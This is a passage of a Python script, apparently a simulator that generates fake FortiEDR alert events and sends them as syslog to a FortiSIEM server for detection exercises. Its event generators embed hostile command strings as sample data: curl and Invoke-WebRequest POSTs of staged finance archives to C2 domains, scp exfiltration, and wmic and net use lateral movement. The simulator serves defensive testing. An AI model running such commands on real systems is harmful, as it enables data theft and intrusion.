    return body_kv(**base(args, data, ep, "discovery", "Host or network discovery activity detected", choose_action(args, "Log"), random.choice(["Inconclusive", "Suspicious"]), command=cmd))

def ev_lateral_movement(args, data, ep):
    dst = random.choice(data["endpoints"])
    cmd = random.choice([f"net use \\\\{dst['ip']}\\C$ /user:corp\\svc_backup", f"wmic /node:{dst['ip']} process call create cmd.exe", f"ssh {dst['ip']}", f"scp /tmp/.sysupdate root@{dst['ip']}:/tmp/"])
    return body_kv(**base(args, data, ep, "lateral_movement", "Lateral movement behavior detected", choose_action(args), "Suspicious", command=cmd, dest=dst["ip"], remote=dst["ip"]))

def ev_collection(args, data, ep):
    cmd = random.choice([r"powershell.exe Compress-Archive -Path C:\Shares\Finance\*.xlsx -DestinationPath C:\Windows\Temp\finance.zip", r"cmd.exe /c dir /s C:\Users\*.xlsx", "tar -czf /tmp/finance_backup.tar.gz /srv/finance", "find /home -name '*.xlsx'"])
    return body_kv(**base(args, data, ep, "collection", "Data collection or staging behavior detected", choose_action(args), "Suspicious", command=cmd))

def ev_exfiltration(args, data, ep):
    c2 = random.choice(data["c2"])
    cmd = random.choice([f"powershell.exe Invoke-WebRequest -Method POST -Uri https://{c2['domain']}/upload -InFile C:\\Windows\\Temp\\finance.zip", f"curl -k -X POST https://{c2['domain']}/upload --data-binary @/tmp/finance_backup.tar.gz", f"scp /tmp/finance_backup.tar.gz user@{c2['ip']}:/upload/"])
    return body_kv(**base(args, data, ep, "exfiltration", "Large outbound transfer or exfiltration pattern detected", choose_action(args, "Block"), "Malicious", command=cmd, dest=c2["ip"], remote=c2["ip"], count=random.randint(10,50)))

def ev_ransomware(args, data, ep):
    action = choose_action(args, "Block")
    fam = ep.get("os_family", "windows")
    cmd = random.choice(RANSOM_CMDS.get(fam, RANSOM_CMDS["windows"])[args.ransomware_intensity])
    fields = base(args, data, ep, "ransomware", f"Ransomware-like file modification behavior detected, intensity {args.ransomware_intensity}", action, "Malicious", command=cmd, dest=ep["hostname"], remote=None, count=random.randint(25,500))
    fields["Threat Name"] = "Ransomware/Behavioral.Detection"
    fields["Threat Family"] = "Ransomware"
    fields["Threat Type"] = "Ransomware"
    fields["Rules List"] = "Ransomware Prevention"
    fields["Sub-system"] = "Prevention"
    return body_kv(**fields)

def ev_device_isolation(args, data, ep):
    fields = base(args, data, ep, "device_isolation", "Endpoint was isolated by FortiEDR playbook", choose_action(args, "Isolate"), "Malicious", command="Auto Isolate Critical Endpoint", dest=ep["hostname"], remote=None, status="Isolated")
    fields["Rules List"] = "Auto Isolate Critical Endpoint"
    fields["Sub-system"] = "Playbook"
    return body_kv(**fields)

def ev_collector_status(args, data, ep):
    connected = random.choice([True, True, True, False])
    return body_kv(**base(args, data, ep, "collector_status", "FortiEDR collector connected" if connected else "FortiEDR collector disconnected", "Log", "Likely Safe" if connected else "Suspicious", dest=ep["hostname"], remote=None, status="Connected" if connected else "Disconnected"))

def ev_system_login(args, data, ep):
    success = random.choice([True, True, False])
    fields = base(args, data, ep, "system_login", "System login" if success else "System login failed", "Log", "Likely Safe" if success else "Suspicious", dest=None, remote=None)
    fields["Users"] = random.choice(["admin", "soc.operator", "readonly.user"])
    fields["User Name"] = fields["Users"]
    fields["Sub-system"] = "System"
    return body_kv(**fields)

GEN = {
    "malicious_file": ev_malicious_file, "suspicious_process": ev_suspicious_process, "c2": ev_c2,
    "credential_access": ev_credential_access, "persistence": ev_persistence, "defense_evasion": ev_defense_evasion,
    "discovery": ev_discovery, "lateral_movement": ev_lateral_movement, "collection": ev_collection,
    "exfiltration": ev_exfiltration, "ransomware": ev_ransomware, "device_isolation": ev_device_isolation,
    "collector_status": ev_collector_status, "system_login": ev_system_login,
}

def expand_ttps(args) -> list[str]:
    if "all" in args.ttps:
        ttps = TTPS_IN_ALL_DEFAULT[:]
        if args.include_ransomware:
            ttps.append("ransomware")
        return ttps
    if "ransomware" in args.ttps and not args.include_ransomware:
        raise SystemExit("Has elegido --ttps ransomware, pero falta --include-ransomware")
    return args.ttps

def load_data(args) -> dict:
    base_c2 = load_c2(args.c2_file)
    enriched_c2 = load_c2_domains(args.c2_domains_file, base_c2)
    return {
        "users": load_users(args.users_file),
        "malware": load_malware(args.malware_file),
        "c2": enriched_c2,
        "c2_routes": load_c2_routes(args.c2_routes_file),
        "attackers": load_attackers(args.attackers_file),
        "external_nodes": load_external_nodes(args.external_nodes_file),
        "endpoints": load_endpoints(args.endpoints_file),
        "processes": load_processes(args.processes_file),
        "commands": load_commands(args.commands_file),
        "reporting": load_reporting(args.reporting_pool_file),
    }

def send_block(args, data, ttps: list[str]) -> int:
    sent = 0
    for i in range(args.count):
        ep = pick_ep(data, args.os_filter)
        ttp = random.choice(ttps)
        reporting = pick_reporting(args, data)
        body = GEN[ttp](args, data, ep)
        if args.dry_run:
            print(syslog_msg(args, reporting, body))
        else:
            send_msg(args, reporting, body)
        sent += 1
        print(f"    OK {i+1:03d}/{args.count} ttp={ttp:18} actions={','.join(args.actions):22} endpoint={ep['hostname']:18} reporting={reporting['ip']}:{reporting['name']}")
        time.sleep(random.uniform(args.min_delay, args.max_delay))
    return sent

def parse_args():
    p = argparse.ArgumentParser(description="FortiEDR extended TTP simulator aligned to FortiSIEM parser")
    p.add_argument("--fortisiem-ip", default=DEFAULT_FORTISIEM_IP)
    p.add_argument("--port", type=int, default=514)
    p.add_argument("--pri", default="<134>")
    p.add_argument("--tz-offset", type=int, default=2)
    p.add_argument("--reporting-mode", choices=["fixed", "random"], default="random")
    p.add_argument("--reporting-ip", default="172.16.20.110")
    p.add_argument("--reporting-name", default=None)
    p.add_argument("--reporting-pool-file", default=str(REPORTING_POOL_FILE_PATH))
    p.add_argument("--users-file", default=str(USERS_FILE_PATH))
    p.add_argument("--malware-file", default=str(MALWARE_FILE_PATH))
    p.add_argument("--c2-file", default=str(C2_FILE_PATH), help="IP/dominios C2 en TXT/CSV/JSON")
    p.add_argument("--attackers-file", default=str(ATTACKERS_FILE_PATH), help="Lista TXT/CSV de IPs atacantes externas, una IP por línea")
    p.add_argument("--attacker-remote-ratio", type=float, default=0.25, help="Probabilidad de usar una IP de attackers-file como Remote Connection cuando el TTP no fija destino")
    p.add_argument("--c2-domains-file", default=str(C2_DOMAINS_FILE_PATH), help="Dominios C2 adicionales, TXT/CSV")
    p.add_argument("--c2-routes-file", default=str(C2_ROUTES_FILE_PATH), help="Rutas URI C2: /checkin, /api/v2/telemetry, etc.")
    p.add_argument("--external-nodes-file", default=str(EXTERNAL_NODES_FILE_PATH), help="Inventario de nodos externos: ip,name,role,country,asn")
    p.add_argument("--use-external-nodes", action="store_true", help="Permite usar external_nodes como destinos C2/exfil/lateral movement")
    p.add_argument("--external-node-ratio", type=float, default=0.35, help="Probabilidad 0-1 de usar nodos externos cuando están habilitados")
    p.add_argument("--external-node-role", default="any", help="Filtra rol de nodo externo para lateral movement: c2, exfil, staging, external, any")
    p.add_argument("--prefer-external-for-exfil", action="store_true", help="Prioriza external_nodes en TTP exfiltration")
    p.add_argument("--exfil-path", default=None, help="Ruta URI fija para exfiltration, ej. /upload o /api/v1/collect")
    p.add_argument("--endpoints-file", default=str(ENDPOINTS_FILE_PATH))
    p.add_argument("--processes-file", default=str(PROCESSES_FILE_PATH), help="CSV de procesos: os;process_name;absolute_path")
    p.add_argument("--commands-file", default=str(COMMANDS_FILE_PATH))
    p.add_argument("--tenant-id", default=DEFAULT_TENANT_ID)
    p.add_argument("--tenant-name", default=DEFAULT_TENANT_NAME)
    p.add_argument("--exercise-id", default=DEFAULT_EXERCISE_ID)
    p.add_argument("--ttps", nargs="+", choices=VALID_TTPS, default=["all"])
    p.add_argument("--actions", nargs="+", choices=VALID_ACTIONS, default=["Log", "Block", "Quarantine"])
    p.add_argument("--os-filter", choices=["any", "windows", "linux"], default="any")
    p.add_argument("--include-ransomware", action="store_true")
    p.add_argument("--ransomware-intensity", choices=["low", "medium", "high"], default="medium")
    p.add_argument("--count", type=int, default=15, help="Mensajes por bloque/ronda")
    p.add_argument("--once", action="store_true")
    p.add_argument("--loop", action="store_true")
    p.add_argument("--interval", type=int, default=60, help="Segundos entre bloques si --loop")
    p.add_argument("--duration-seconds", type=int, default=0, help="Duración máxima del loop. 0 = indefinido")
    p.add_argument("--max-blocks", type=int, default=0, help="Número máximo de bloques. 0 = sin límite")
    p.add_argument("--min-delay", type=float, default=0.2)
    p.add_argument("--max-delay", type=float, default=0.8)
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--print-test-events", action="store_true")
    p.add_argument("--list-options", action="store_true")
    return p.parse_args()

def main():
    args = parse_args()
    if args.list_options:
        print("TTPs:", ", ".join(VALID_TTPS))
        print("Actions:", ", ".join(VALID_ACTIONS))
        return
    data = load_data(args)
    ttps = expand_ttps(args)
    print("[+] FortiEDR Extended TTP Simulator -> FortiSIEM")
    print(f"[+] FortiSIEM: {args.fortisiem_ip}:{args.port}/UDP")
    print(f"[+] Reporting mode: {args.reporting_mode}")
    print(f"[+] TTPs: {', '.join(ttps)}")
    print(f"[+] Actions: {', '.join(args.actions)}")
    print(f"[+] Count per block: {args.count}")
    print(f"[+] Ransomware enabled: {args.include_ransomware} / intensity={args.ransomware_intensity}")
    print(f"[+] Data: users={len(data['users'])}, endpoints={len(data['endpoints'])}, malware={len(data['malware'])}, c2={len(data['c2'])}, c2_routes={len(data['c2_routes'])}, attackers={len(data['attackers'])}, external_nodes={len(data['external_nodes'])}, processes_win={len(data['processes'].get('windows', []))}, processes_linux={len(data['processes'].get('linux', []))}, commands={len(data['commands'])}")
    if args.print_test_events:
        for ttp in ttps[:6]:
            ep = pick_ep(data, args.os_filter)
            reporting = pick_reporting(args, data)
            print(f"\n### TEST {ttp}")
            print(syslog_msg(args, reporting, GEN[ttp](args, data, ep)))
        return
    if not args.loop:
        send_block(args, data, ttps)
        print("[+] Finalizado.")
        return
    start = time.time()
    blocks = 0
    while RUNNING:
        blocks += 1
        print(f"\n[+] Bloque {blocks}")
        send_block(args, data, ttps)
        if args.max_blocks and blocks >= args.max_blocks:
            print("[+] max-blocks alcanzado.")
            break
        if args.duration_seconds and time.time() - start >= args.duration_seconds:
            print("[+] duration-seconds alcanzado.")
            break
        print(f"[+] Próximo bloque en {args.interval} segundos")
        for _ in range(args.interval):
            if not RUNNING:
                break
            if args.duration_seconds and time.time() - start >= args.duration_seconds:
                break
            time.sleep(1)
    print("[+] Simulador detenido.")

if __name__ == "__main__":
    main()
